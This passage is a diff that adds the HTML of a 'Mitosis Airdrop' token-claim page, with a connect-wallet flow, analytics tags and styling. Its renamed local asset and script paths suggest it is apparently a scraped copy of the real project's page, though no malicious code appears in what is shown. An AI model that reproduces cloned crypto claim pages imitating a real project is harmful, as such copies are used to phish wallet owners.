-s.p.otf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/otf\"}]\n:HL[\"/_next/static/media/b0047e94e7f0c63f-s.p.otf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/otf\"}]\n:HL[\"/_next/static/media/cb07cb684de218c2-s.p.otf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/otf\"}]\n:HL[\"/_next/static/css/9a8253d15b14e3f8."])
+	</script>
+	<script>
+	self.__next_f.push([1, "css\",\"style\"]\n:HL[\"/_next/static/css/3f3ba32d1e0a2869.css\",\"style\"]\n"])
+	</script>
+	<script>
+	self.__next_f.push([1, "0:{\"P\":null,\"b\":\"sfM1i_p-hOA1IeEPQaxVq\",\"p\":\"\",\"c\":[\"\",\"flow\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"(app)\",{\"children\":[\"(with-provider)\",{\"children\":[\"flow\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/9a8253d15b14e3f8.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/3f3ba32d1e0a2869.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],\"$L2\"]}],{\"children\":[\"(app)\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"(with-provider)\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L5\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"flex min-h-screen flex-col bg-[url(/images/bg.png)] bg-cover bg-top bg-no-repeat\",\"children\":[[\"$\",\"$L6\",null,{}],[\"$\",\"section\",null,{\"className\":\"flex flex-1 flex-col\",\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"$L7\",null,{}]]}]}]]}],{\"children\":[\"flow\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"$L8\",null,{\"Component\":\"$9\",\"searchParams\":{},\"params\":{}}],[\"$\",\"$La\",null,{\"children\":\"$Lb\"}],null,[\"$\",\"$Lc\",null,{\"children\":[\"$Ld\",\"$Le\",[\"$\",\"$Lf\",null,{\"promise\":\"$@10\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"j_Rh7k3cCoX5Juww4Nr0x\",{\"children\":[[\"$\",\"$L11\",null,{\"children\":\"$L12\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$13\",\"$undefined\"],\"s\":false,\"S\":false}\n"])
+	</script>
+	<script>
+	self.__next_f.push([1, "b:[\"$\",\"$14\",null,{\"fallback\":null,\"children\":[\"$\",\"$L15\",null,{\"promise\":\"$@16\"}]}]\n"])
+	</script>
+	<script>
+	self.__next_f.push([1, "2:[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"$L17\",null,{\"async\":true,\"src\":\"https://www.googletagmanager.com/gtag/js?id=G-FS4MSQT8QZ\"}],[\"$\",\"$L17\",null,{\"id\":\"gtag\",\"children\":\"\\nwindow.dataLayer = window.dataLayer || [];\\nfunction gtag(){dataLayer.push(arguments);}\\ngtag('js', new Date());\\ngtag('config', 'G-FS4MSQT8QZ');\\n\"}]]}],[\"$\",\"body\",null,{\"className\":\"__variable_a8b027 __variable_5cfdac font-sans antialiased\",\"children\":[\"$L18\",[\"$\",\"$L19\",null,{\"initialConfig\":{\"appType\":\"claim\",\"project\":{\"partner\":{\"name\":\"Mitosis\",\"website\":\"\"},\"website\":{\"title\":\"Mitosis Airdrop\",\"description\":\"Mitosis Airdrop\",\"keywords\":\"Mitosis Airdrop\"},\"links\":{\"x\":\"https://x.com/MitosisOrg\",\"discord\":\"https://discord.com/invite/mitosis\",\"github\":\"\",\"telegram\":\"\"}},\"theme\":{\"basic\":{\"defaultMode\":\"light\",\"radius\":\"0.875rem\"},\"colors\":{\"light\":{\"primary\":\"#6058FD\",\"primaryForeground\":\"#ffffff\",\"secondary\":\"#F3F4FF\",\"secondaryForeground\":\"#6058FD\",\"background\":\"#ffffff\",\"foreground\":\"#0B0E15\",\"muted\":\"#f1f5f9\",\"mutedForeground\":\"#697586\",\"accent\":\"#6058FD\",\"accentForeground\":\"#ffffff\",\"positive\":\"#32C568\",\"positiveForeground\":\"#ffffff\",\"destructive\":\"#dc2626\",\"destructiveForeground\":\"#ffffff\",\"border\":\"#E3E8EF\",\"input\":\"#E3E8EF\",\"ring\":\"#6058FD\"}}},\"flow\":{\"stepConfigs\":{\"claimConnect\":{\"stepTitle\":\"Connect Wallet\",\"title\":\"Connect Wallet\",\"description\":\"Connect your recipient wallet address used during registration to view your MITO allocation\"},\"claimEligibility\":{\"stepTitle\":\"Confirm Registration\",\"eligibleTitle\":\"Ready to Claim!\",\"eligibleDescription\":\"You're eligible to claim MITO tokens\",\"notEligibleTitle\":\"Not eligible for rewards.\",\"notEligibleDescription\":\"Sorry, this wallet address is not eligible.\"},\"claimAction\":{\"stepTitle\":\"Claim Tokens\",\"title\":\"Ready to Claim!\",\"description\":\"You're eligible to claim MITO tokens\"},\"claimComplete\":{\"stepTitle\":\"Claim Success\",\"title\":\"Congratulations！\",\"description\":\"You have claimed your Token.\"}}},\"legal\":{\"links\":{\"airdropTermsOfService\":\"/airdrop-tos\"}},\"blockchain\":{\"network\":{\"chainId\":124816},\"distributor\":{\"distributorContractAddress\":\"$undefined\"}}},\"children\":[[\"$\",\"$L1a\",null,{}],[\"$\",\"$L1b\",null,{}],[\"$\",\"$L1c\",null,{\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":\"$0:f:0:1:2:children:1:props:children:1:props:notFound:0:1:props:style\",\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":\"$0:f:0:1:2:children:1:props:children:1:props:notFound:0:1:props:children:props:children:1:props:style\",\"children\":404}],[\"$\",\"div\",null,{\"style\":\"$0:f:0:1:2:children:1:props:children:1:props:notFound:0:1:props:children:props:children:2:props:style\",\"children\":[\"$\",\"h2\",null,{\"style\":\"$0:f:0:1:2:children:1:props:children:1:props:notFound:0:1:props:children:props:children:2:props:children:props:style\",\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}]]}]\n"])
+	</script>
+	<script>
+	self.__next_f.push([1, "e:null\n18:[\"$\",\"div\",null,{\"children\":[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\":root {\\n  --background: #ffffff;\\n--foreground: #0B0E15;\\n--primary: #6058FD;\\n--primary-foreground: #ffffff;\\n--secondary: #F3F4FF;\\n--secondary-foreground: #6058FD;\\n--muted: #f1f5f9;\\n--muted-foreground: #697586;\\n--accent: #6058FD;\\n--accent-foreground: #ffffff;\\n--positive: #32C568;\\n--positive-foreground: #ffffff;\\n--destructive: #dc2626;\\n--destructive-foreground: #ffffff;\\n--border: #E3E8EF;\\n--input: #E3E8EF;\\n--ring: #6058FD;\\n--radius: 0.875rem;\\n}\"}}]}]\n12:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nd:null\n16:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Mitosis Airdrop\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Mitosis Airdrop\"}],[\"$\",\"meta\",\"2\",{\"name\":\"keywords\",\"content\":\"Mitosis Airdrop\"}],[\"$\",\"link\",\"3\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"512x512\"}]],\"error\":null,\"digest\":\"$undefined\"}\n10:{\"metadata\":\"$16:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])
+	</script>
+	<script async data-nscript="afterInteractive" src="scripts/36"></script>
+	<script id="gtag" data-nscript="afterInteractive">
+	window.dataLayer = window.dataLayer || [];
+
+	function gtag() {
+		dataLayer.push(arguments);
+	}
+	gtag('js', new Date());
+	gtag('config', 'G-FS4MSQT8QZ');
+	</script>
+	<next-route-announcer style="position:absolute">
+		<template shadowrootmode="open">
+			<div aria-live="assertive" id="__next-route-announcer__" role="alert" style="position:absolute;border:0px;height:1px;margin:-1px;padding:0px;width:1px;clip:rect(0px,0px,0px,0px);overflow:hidden;white-space:nowrap;overflow-wrap:normal"></div>
+		</template>
+	</next-route-announcer>
+	<section class="Toastify" aria-live="polite" aria-atomic="false" aria-relevant="additions text" aria-label="Notifications Alt+T"></section>
+	<div data-rk>
+		<style>
+		[data-rk] {
+			--rk-blurs-modalOverlay: blur(0px);
+			--rk-fonts-body: SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+			--rk-radii-actionButton: 9999px;
+			--rk-radii-connectButton: 12px;
+			--rk-radii-menuButton: 12px;
+			--rk-radii-modal: 24px;
+			--rk-radii-modalMobile: 28px;
+			--rk-colors-accentColor: #0E76FD;
+			--rk-colors-accentColorForeground: #FFF;
+			--rk-colors-actionButtonBorder: rgba(0, 0, 0, 0.04);
+			--rk-colors-actionButtonBorderMobile: rgba(0, 0, 0, 0.06);
+			--rk-colors-actionButtonSecondaryBackground: rgba(0, 0, 0, 0.06);
+			--rk-colors-closeButton: rgba(60, 66, 66, 0.8);
+			--rk-colors-closeButtonBackground: rgba(0, 0, 0, 0.06);
+			--rk-colors-connectButtonBackground: #FFF;
+			--rk-colors-connectButtonBackgroundError: #FF494A;
+			--rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));
+			--rk-colors-connectButtonText: #25292E;
+			--rk-colors-connectButtonTextError: #FFF;
+			--rk-colors-connectionIndicator: #30E000;
+			--rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;
+			--rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;
+			--rk-colors-error: #FF494A;
+			--rk-colors-generalBorder: rgba(0, 0, 0, 0.06);
+			--rk-colors-generalBorderDim: rgba(0, 0, 0, 0.03);
+			--rk-colors-menuItemBackground: rgba(60, 66, 66, 0.1);
+			--rk-colors-modalBackdrop: rgba(0, 0, 0, 0.3);
+			--rk-colors-modalBackground: #FFF;
+			--rk-colors-modalBorder: transparent;
+			--rk-colors-modalText: #25292E;
+			--rk-colors-modalTextDim: rgba(60, 66, 66, 0.3);
+			--rk-colors-modalTextSecondary: rgba(60, 66, 66, 0.6);
+			--rk-colors-profileAction: #FFF;
+			--rk-colors-profileActionHover: rgba(255, 255, 255, 0.5);
+			--rk-colors-profileForeground: rgba(60, 66, 66, 0.06);
+			--rk-colors-selectedOptionBorder: rgba(60, 66, 66, 0.1);
+			--rk-colors-standby: #FFD641;
+			--rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+			--rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+			--rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+			--rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+			--rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.12);
+			--rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16)
+		}
+		</style>
+		<main class="flex min-h-screen flex-col bg-[url(/images/bg.png)] bg-cover bg-top bg-no-repeat">
+			<header class="flex h-16 items-center justify-between px-6 sm:h-20">
+				<div class="hidden sm:block transition-all duration-700 ease-out opacity-100 translate-x-0">
+					<div class="relative w-full overflow-hidden aspect-[90/20] h-5"><img alt="project logo" loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" srcset="images/15.webp 640w, images/16.webp 750w, images/17.webp 828w, images/18.webp 1080w, images/19.webp 1200w, images/20.webp 1920w, images/21.webp 2048w, images/22.webp 3840w" src="images/13.webp" style="position:absolute;height:100%;width:100%;inset:0px;object-fit:contain;color:transparent"></div>
+				</div>
+				<div class="flex items-center justify-center rounded-full bg-white/72 px-5 py-1.5 text-center sm:py-3 sm:text-start transition-all duration-700 ease-out opacity-100 translate-x-0">
+					<div class="text-sm leading-tight text-primary/80">Please visit our <a target="_blank" class="underline hover:text-primary" href="https://discord.com/invite/mitosis">Discord</a> if you have any questions or need further support.</div>
+				</div>
+			</header>
+			<section class="flex flex-1 flex-col">
+				<div class="container py-12">
+					<div class="mx-auto flex w-full max-w-[766px] flex-col items-stretch justify-start custom-card rounded-full px-6 py-8">
+						<div class="flex w-full items-start justify-center">
+							<div class="z-10 flex w-full max-w-44 min-w-0 flex-1 basis-0 flex-col items-center">
+								<div class="flex w-full items-center justify-center gap-3">
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border right-0 rounded-l-none rounded-r-sm hidden"></div>
+									</div>
+									<div class="flex size-8 items-center justify-center rounded-full border text-lg font-medium sm:size-10 sm:text-xl border-primary bg-primary text-primary-foreground"><span class="translate-y-[1px] font-mori">1</span></div>
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border left-0 rounded-l-sm rounded-r-none visible"></div>
+									</div>
+								</div>
+								<div class="mt-4 flex flex-col items-center text-center"><span class="px-2 text-center text-xs md:text-nowrap text-primary">Connect Wallet</span></div>
+							</div>
+							<div class="z-10 flex w-full max-w-44 min-w-0 flex-1 basis-0 flex-col items-center">
+								<div class="flex w-full items-center justify-center gap-3">
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border right-0 rounded-l-none rounded-r-sm visible"></div>
+									</div>
+									<div class="flex size-8 items-center justify-center rounded-full border text-lg font-medium sm:size-10 sm:text-xl bg-transparent text-muted-foreground"><span class="translate-y-[1px] font-mori">2</span></div>
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border left-0 rounded-l-sm rounded-r-none visible"></div>
+									</div>
+								</div>
+								<div class="mt-4 flex flex-col items-center text-center"><span class="px-2 text-center text-xs md:text-nowrap text-muted-foreground">Confirm Registration</span></div>
+							</div>
+							<div class="z-10 flex w-full max-w-44 min-w-0 flex-1 basis-0 flex-col items-center">
+								<div class="flex w-full items-center justify-center gap-3">
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border right-0 rounded-l-none rounded-r-sm visible"></div>
+									</div>
+									<div class="flex size-8 items-center justify-center rounded-full border text-lg font-medium sm:size-10 sm:text-xl bg-transparent text-muted-foreground"><span class="translate-y-[1px] font-mori">3</span></div>
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border left-0 rounded-l-sm rounded-r-none visible"></div>
+									</div>
+								</div>
+								<div class="mt-4 flex flex-col items-center text-center"><span class="px-2 text-center text-xs md:text-nowrap text-muted-foreground">Claim Tokens</span></div>
+							</div>
+							<div class="z-10 flex w-full max-w-44 min-w-0 flex-1 basis-0 flex-col items-center">
+								<div class="flex w-full items-center justify-center gap-3">
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border right-0 rounded-l-none rounded-r-sm visible"></div>
+									</div>
+									<div class="flex size-8 items-center justify-center rounded-full border text-lg font-medium sm:size-10 sm:text-xl bg-transparent text-muted-foreground"><span class="translate-y-[1px] font-mori">4</span></div>
+									<div class="relative flex-1">
+										<div class="absolute top-1/2 h-[1px] w-full -translate-y-1/2 bg-border left-0 rounded-l-sm rounded-r-none hidden"></div>
+									</div>
+								</div>
+								<div class="mt-4 flex flex-col items-center text-center"><span class="px-2 text-center text-xs md:text-nowrap text-muted-foreground">Claim Success</span></div>
+							</div>
+						</div>
+					</div>
+					<div class="mx-auto mt-3 flex w-full max-w-[800px] flex-col items-stretch justify-start custom-card bg-white p-6">
+						<div class="w-full">
+							<div class="stack">
+								<div class="mb-2">
+									<div class="relative overflow-hidden size-[100px]"><img alt loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" srcset="images/23.webp 640w, images/24.webp 750w, images/25.webp 828w, images/26.webp 1080w, images/27.webp 1200w, images/28.webp 1920w, images/29.webp 2048w, images/30.webp 3840w" src="images/14.webp" style="position:absolute;height:100%;width:100%;inset:0px;object-fit:contain;color:transparent"></div>
+								</div>
+								<div>
+									<p class="font-medium dark:opacity-80">Connect Wallet</p>
+								</div>
+								<div class="mt-2">
+									<div class="prose max-w-full text-sm text-muted-foreground">
+										<p style="margin:0px">Connect your recipient wallet address used during registration to view your MITO allocation</p>
+									</div>
+								</div>
+								<div class="mt-6">
+									<div class="stack gap-6">
+										<div class="open-modal-btne stack min-h-10 gap-3 rounded-[8px] border px-3 py-1 sm:px-4 cursor-pointer">
+											<div class="flex flex-1 items-center gap-2">
+												<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none" class="size-5 shrink-0 text-muted-foreground">
+													<path d="M4.3998 17.2C3.9598 17.2 3.58314 17.0434 3.2698 16.73C2.95647 16.4167 2.7998 16.04 2.7998 15.6V4.40005C2.7998 3.96005 2.95647 3.58338 3.2698 3.27005C3.58314 2.95672 3.9598 2.80005 4.3998 2.80005H15.5998C16.0398 2.80005 16.4165 2.95672 16.7298 3.27005C17.0431 3.58338 17.1998 3.96005 17.1998 4.40005V6.40005H15.5998V4.40005H4.3998V15.6H15.5998V13.6H17.1998V15.6C17.1998 16.04 17.0431 16.4167 16.7298 16.73C16.4165 17.0434 16.0398 17.2 15.5998 17.2H4.3998ZM10.7998 14C10.3598 14 9.98314 13.8434 9.6698 13.53C9.35647 13.2167 9.1998 12.84 9.1998 12.4V7.60005C9.1998 7.16005 9.35647 6.78338 9.6698 6.47005C9.98314 6.15672 10.3598 6.00005 10.7998 6.00005H16.3998C16.8398 6.00005 17.2165 6.15672 17.5298 6.47005C17.8431 6.78338 17.9998 7.16005 17.9998 7.60005V12.4C17.9998 12.84 17.8431 13.2167 17.5298 13.53C17.2165 13.8434 16.8398 14 16.3998 14H10.7998ZM16.3998 12.4V7.60005H10.7998V12.4H16.3998ZM13.1998 11.2C13.5331 11.2 13.8165 11.0834 14.0498 10.85C14.2831 10.6167 14.3998 10.3334 14.3998 10C14.3998 9.66672 14.2831 9.38338 14.0498 9.15005C13.8165 8.91672 13.5331 8.80005 13.1998 8.80005C12.8665 8.80005 12.5831 8.91672 12.3498 9.15005C12.1165 9.38338 11.9998 9.66672 11.9998 10C11.9998 10.3334 12.1165 10.6167 12.3498 10.85C12.5831 11.0834 12.8665 11.2 13.1998 11.2Z" fill="currentColor"></path>
+												</svg>
+												<div class="flex flex-1 items-center">
+													<p class="text-sm font-medium sm:text-base ">Connect Wallet</p>
+												</div>
+												<div class="flex items-center justify-end">
+													<button data-slot="button" class="inline-flex cursor-pointer items-center justify-center text-sm text-center font-medium transition-[color,box-shadow] disabled:pointer-events-none disabled:text-black/60 disabled:opacity-60 disabled:bg-gray-200 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground h-9 rounded-sm gap-1.5 px-3 has-[>svg]:px-2.5">
+														<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-right size-4">
+															<path d="m9 18 6-6-6-6"></path>
+														</svg>
+													</button>
+												</div>
+											</div>
+										</div>
+										<button data-slot="button" class="inline-flex cursor-pointer items-center justify-center gap-2 rounded-sm text-sm text-center font-medium transition-[color,box-shadow] disabled:pointer-events-none disabled:text-black/60 disabled:opacity-60 disabled:bg-gray-200 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive bg-primary text-primary-foreground shadow-xs hover:bg-primary/90 min-h-10 px-4 py-2 has-[>svg]:px-3 [&amp;_svg]:size-4 w-full" disabled>Next</button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+			<footer class="stack gap-4 px-4 py-6 sm:border-t"><a target="_blank" class="flex items-center justify-center gap-2 w-fit" href="https://clique.tech/"><span class="text-nowrap text-sm font-medium">Powered by</span><svg viewBox="0 0 80 22" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-4 w-16 text-foreground" style="aspect-ratio:80/22"><g clip-path="url(#clip0_6597_8507)"><path d="M80.3391 3.97186C80.3235 3.82305 80.1974 3.70703 80.0441 3.70703H75.5546H73.7443H69.2549C69.0909 3.70703 68.9583 3.8397 68.9583 4.00363V7.18758C68.9583 7.21179 68.9613 7.23449 68.9668 7.25719C68.9663 9.87618 68.9658 12.4952 68.9658 15.1142C68.9613 15.1353 68.9583 15.157 68.9583 15.1797V18.3637C68.9583 18.5276 69.0909 18.6603 69.2549 18.6603H73.7443H75.5546H80.0441C80.208 18.6603 80.3407 18.5276 80.3407 18.3637V18.3021C80.3407 17.261 80.3407 16.2204 80.3407 15.1792C80.3407 15.1596 80.3407 15.1399 80.3407 15.1202C80.3341 15.1031 80.327 15.0864 80.32 15.0708C80.3134 15.0546 80.3059 15.0395 80.2968 15.0249C80.2095 14.8655 80.0814 14.7954 79.8741 14.7903C79.8171 14.7888 79.7601 14.7898 79.7031 14.7898C77.7328 14.7898 75.763 14.7898 73.7932 14.7898C73.6923 14.7898 73.5914 14.7883 73.4915 14.7706C73.2272 14.7242 73.093 14.5714 73.089 14.302C73.086 14.0831 73.0875 13.8637 73.0885 13.6448C73.09 13.2871 73.2494 13.1242 73.6081 13.1116C73.6605 13.1096 73.7135 13.1106 73.766 13.1106C74.9942 13.1106 76.223 13.1106 77.4513 13.1106C77.9779 13.1106 78.5045 13.1121 79.0307 13.1101C79.3237 13.1085 79.5079 12.9552 79.5694 12.6707C79.587 12.589 79.5916 12.5058 79.5916 12.4225C79.5916 11.5902 79.5916 10.7574 79.5916 9.92511C79.5916 9.8328 79.5845 9.7415 79.5623 9.6512C79.5013 9.40151 79.3353 9.26179 79.0776 9.24363C79.016 9.23959 78.955 9.2411 78.8935 9.2411C77.1779 9.2411 75.4623 9.2411 73.7468 9.2411C73.6636 9.2411 73.5798 9.24363 73.4971 9.23102C73.2308 9.19066 73.093 9.03832 73.0885 8.76896C73.084 8.50161 73.085 8.23427 73.088 7.96743C73.091 7.71017 73.2383 7.54169 73.4936 7.49528C73.5385 7.48721 73.5834 7.48469 73.6287 7.48368H73.7433H75.5536H80.043C80.207 7.48368 80.3396 7.35102 80.3396 7.18708V7.15278C80.3396 6.10256 80.3396 5.05284 80.3396 4.00263C80.3396 3.99203 80.3396 3.98144 80.3396 3.97085C80.3402 3.97186 80.3402 3.97186 80.3391 3.97186Z" fill="currentColor"></path><path d="M66.0193 9.62753V3.98652C66.0193 3.83166 65.8937 3.70605 65.7389 3.70605H62.1857C62.0308 3.70605 61.9052 3.83166 61.9052 3.98652V4.07277C61.8997 4.09194 61.9022 4.11363 61.9052 4.13532V6.21003V9.62753H61.9088C61.9088 10.0982 61.9088 10.5693 61.9088 11.0399H61.9052V12.6763C61.9052 14.0186 60.8172 15.1071 59.4744 15.1071C58.1321 15.1071 57.0436 14.0191 57.0436 12.6763V11.0399H57.0375C57.0375 10.5693 57.0375 10.0982 57.0375 9.62753H57.0436V6.21003V3.98652C57.0436 3.83166 56.918 3.70605 56.7631 3.70605H53.2099C53.055 3.70605 52.9294 3.83166 52.9294 3.98652V9.62702C52.9294 10.2571 52.9294 10.8876 52.9294 11.5176C52.9294 11.5181 52.9294 11.5191 52.9294 11.5196V12.8327C52.9294 12.8332 52.9294 12.8332 52.9294 12.8332C52.9294 12.877 52.9294 12.9209 52.9294 12.9648C52.9294 12.9966 52.9315 13.0284 52.934 13.0597C52.9385 13.1812 52.9466 13.3018 52.9582 13.4213C52.9577 13.4254 52.9577 13.4299 52.9577 13.4339C52.9567 13.444 52.9587 13.4521 52.9622 13.4597C53.0384 14.1961 53.2472 14.8927 53.5645 15.5258C53.5701 15.5409 53.5771 15.5556 53.5857 15.5687C53.6094 15.6151 53.6336 15.661 53.6583 15.7064C53.6654 15.7321 53.6765 15.7553 53.6957 15.7735C53.7234 15.8229 53.7522 15.8723 53.7809 15.9213C53.7885 15.949 53.8016 15.9732 53.8243 15.9924C53.8702 16.067 53.9181 16.1407 53.9671 16.2133C53.9797 16.2517 53.9993 16.285 54.0326 16.3082C54.0452 16.3258 54.0579 16.343 54.0705 16.3606C54.0785 16.4025 54.0952 16.4378 54.1391 16.4534C54.1915 16.5231 54.245 16.5911 54.3005 16.6582C54.305 16.69 54.3217 16.7102 54.3514 16.7188C54.4104 16.7884 54.4705 16.8565 54.5325 16.9236C54.6107 17.0426 54.7076 17.143 54.8271 17.2202C54.8735 17.2635 54.9204 17.3064 54.9678 17.3483C54.9941 17.3977 55.0314 17.4335 55.0844 17.4487C55.1086 17.4689 55.1328 17.489 55.157 17.5087C55.1696 17.5324 55.1888 17.5491 55.2155 17.5561C55.2286 17.5662 55.2417 17.5768 55.2544 17.5869C55.2639 17.6177 55.2897 17.6288 55.3184 17.6363C55.3573 17.6656 55.3961 17.6943 55.4354 17.7231C55.4511 17.7407 55.4697 17.7544 55.4914 17.7629C55.5192 17.7826 55.5474 17.8018 55.5752 17.8209C55.5853 17.8366 55.6009 